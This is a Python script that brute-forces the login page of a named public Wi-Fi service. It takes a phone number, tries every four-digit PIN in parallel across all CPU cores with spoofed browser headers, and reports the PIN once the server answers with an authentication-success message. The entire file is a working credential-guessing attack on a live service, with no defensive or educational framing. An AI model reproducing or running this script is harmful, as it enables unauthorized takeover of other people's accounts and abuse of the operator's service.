import requests
from multiprocessing import Pool, Manager, cpu_count

url = "https://wifi.ais.co.th/login"

headers = {
    "Accept": "*/*",
    "Accept-Language": "th,en-US;q=0.9,en;q=0.8",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "DNT": "1",
    "Origin": "https://wifi.ais.co.th",
    "Referer": "https://wifi.ais.co.th/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}


def test_range(start, end, success_flag, phone):
    for number in range(start, end + 1):
        if success_flag.value:
            return  # Exit if a successful login is found
        payload = f"txtUsername={phone}&txtPassword={number:04d}"
        print(payload)
        response = requests.post(url, headers=headers, data=payload)
        if "WEB Authentication Success." in response.text:
            success_flag.value = True
            print(f"Successful login found with password: {number:04d}")
            return  # Exit this process upon finding the successful login


if __name__ == "__main__":
    # Prompt the user to enter the phone number
    phone = input("Enter the phone number: ")

    with Manager() as manager:
        success_flag = manager.Value(
            "b", False
        )  # Shared boolean flag to indicate success
        num_processes = cpu_count()  # Dynamically determine the number of processes

        # Divide the range of numbers into chunks equal to the number of CPU cores
        total_range = 10000  # 0000 to 9999
        chunk_size = total_range // num_processes
        ranges = [
            (i * chunk_size, (i + 1) * chunk_size - 1) for i in range(num_processes)
        ]

        with Pool(processes=num_processes) as pool:
            pool.starmap(
                test_range, [(start, end, success_flag, phone) for start, end in ranges]
            )

        if success_flag.value:
            print("Process completed with a successful login.")
        else:
            print("No successful login was found.")
